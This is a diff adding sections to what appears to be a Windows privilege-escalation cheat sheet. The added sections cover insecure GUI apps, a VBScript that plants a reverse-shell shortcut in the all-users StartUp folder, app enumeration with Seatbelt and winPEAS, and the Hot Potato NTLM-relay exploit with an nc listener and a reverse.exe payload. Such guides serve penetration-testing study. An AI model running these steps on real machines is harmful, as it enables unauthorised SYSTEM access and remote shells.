@@ -974,11 +974,90 @@ C:\Users\Administrator\Desktop>type root.txt
 
 ## Applications
 
-### Insecure GUI Apps
+### Insecure GUI Apps 
+
+Users on some \(earlier\) versions of Windows may be given the ability to execute some GUI software with administrator capabilities. There are a variety of methods for spawning command prompts from within GUI software, including native Windows capability. The generated command prompt will execute with administrator privileges because the parent process is running with them.
+
+#### Insecure GUI Apps Privilege Escalation
+
+1. Open a command prompt and run:
+
+   ```text
+   > tasklist /V | findstr vulnerable.exe
+   ```
+
+   > Note that the executable must be running with admin privileges.
+
+2. In the vulnerable GUI executable, click File, then Open.
+3. In the navigation input, replace the contents with a malicious file:
+
+   ```text
+   file://c:/windows/system32/cmd.exe
+   ```
+
+4. Press Enter and then the malicious file will be executed.
 
 ### Startup Apps
 
-### Installed Apps
+By setting shortcuts to programs in a certain directory, each user can determine which apps start when they log in. For apps that should start for all users, Windows additionally includes a startup directory:
+
+```text
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+```
+
+We can use our reverse shell executable to escalate privileges when an admin logs in **if we can create files in this directory**.
+
+It's important to remember that shortcut files \(.lnk\) must be used. To make a shortcut file, use the following VBScript:
+
+```text
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\Users\Public\reverse.exe"
+oLink.Save
+```
+
+#### Startup Apps Privilege Escalation
+
+1. Check the permissions on the StartUp directory with accesschk.exe:
+
+   ```text
+   .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+   ```
+
+2. The `BUILTIN\Users` group must have write access to this directory.
+3. Using VBScript, create the file CreateShortcut.vbs. If necessary, change the file paths.
+4. Using cscript, run the script:
+
+   ```text
+   > cscript CreateShortcut.vbs
+   ```
+
+5. Start a listener on Kali, then an admin user must log in to trigger the exploit.
+
+### Installed Applications
+
+The majority of privilege escalations involving installed apps are due to misconfigurations. Even so, some privilege escalation is caused through memory corruption exploits, therefore knowing how to identify installed applications and known vulnerabilities is still necessary.
+
+#### Install Applications Commands
+
+Manually enumerate all running programs:
+
+```text
+tasklist /v
+```
+
+We can also use Seatbelt to search for nonstandard processes:
+
+```text
+.\seatbelt.exe NonstandardProcesses
+```
+
+winPEAS also has this ability \(note the misspelling\):
+
+```text
+.\winPEASany.exe quiet procesinfo
+```
 
 We can enumerate installed applications with wmic:
 
@@ -987,7 +1066,31 @@ wmic product get name, version, vendor
 wmic qfe get Caption, Description, HotFixID, InstalledOn
 ```
 
+### Exploit-DB
+
+Once you've found a process that interests you, try to figure out which version it is. You can also check the config or text files in the Program Files directory, as well as executing the executable with /? or -h. To find a corresponding exploit, use Exploit-DB. Some exploits include instructions, while others need you to compile and run code.
+
 ## Hot Potato
+
+The term "Hot Potato" refers to an attack that combines a spoofing assault with an NTLM relay attack in order to achieve SYSTEM rights. The technique convinces Windows to use NTLM to authenticate as the SYSTEM user to a bogus HTTP server. To acquire command execution, the NTLM credentials are subsequently sent to SMB. This technique is capable of infecting Windows 7, 8, and early versions of Windows 10, as well as their server counterparts.
+
+### Hot Potato Privilege Escalation
+
+1. Copy the potato.exe exploit executable over to Windows. 
+
+2. Start a listener on your host \(e.g Kali or Parrot\):
+
+```text
+nc -lvnp <PORT>
+```
+
+3. Run the exploit:
+
+```text
+.\potato.exe -ip 192.168.10.10 -cmd "C:\Users\Public\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+```
+
+4. Wait for a Windows Defender update, or trigger one manually
 
 ## Juicy Potato
 
